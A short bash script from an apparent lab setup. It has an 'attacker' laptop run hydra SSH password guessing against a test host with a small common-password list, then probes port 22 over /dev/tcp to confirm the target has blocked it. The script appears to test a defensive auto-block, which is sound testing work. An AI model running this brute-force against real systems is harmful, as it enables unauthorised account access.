#!/bin/bash
# Laptop A (attacker): SSH password guessing against T, then prove from here that T has cut A off.
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
. "$ROOT/multi/common.sh"
command -v hydra >/dev/null || { echo "hydra missing: run multi/install_A.sh"; exit 1; }
printf 'password\n123456\nadmin\nletmein\n' > /tmp/pw.txt
echo "=== attacking testuser@$T_IP from $A_IP ==="
hydra -l testuser -P /tmp/pw.txt -t 4 ssh://"$T_IP"
echo
echo "=== is T still reachable from here? (a block shows as a timeout) ==="
if timeout 4 bash -c "exec 3<>/dev/tcp/$T_IP/22" 2>/dev/null; then
  echo "STILL OPEN: T did not block this laptop"
else
  echo "BLOCKED: port 22 on $T_IP no longer answers"
fi
